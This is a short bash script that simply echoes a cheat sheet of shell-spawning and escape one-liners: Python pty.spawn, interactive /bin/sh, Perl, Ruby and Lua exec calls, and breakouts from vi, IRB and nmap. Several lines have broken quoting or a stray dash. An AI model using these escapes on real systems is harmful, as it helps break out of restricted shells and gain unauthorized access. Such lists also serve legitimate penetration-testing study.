#!/bin/bash


echo "python -c 'import pty; pty.spawn("/bin/sh")'"
echo "echo os.system('/bin/bash')"
echo "/bin/sh -i"
echo "perl —e 'exec "/bin/sh";'"
echo "perl: exec "/bin/sh";"
echo "ruby: exec "/bin/sh""
echo "lua: os.execute('/bin/sh') "
echo "exec '/bin/sh' , (from within IRB) "
echo ":!bash ,from within  vi"
echo ":set shell=/bin/bash:shell, from within vi "
echo "!sh , nmap "
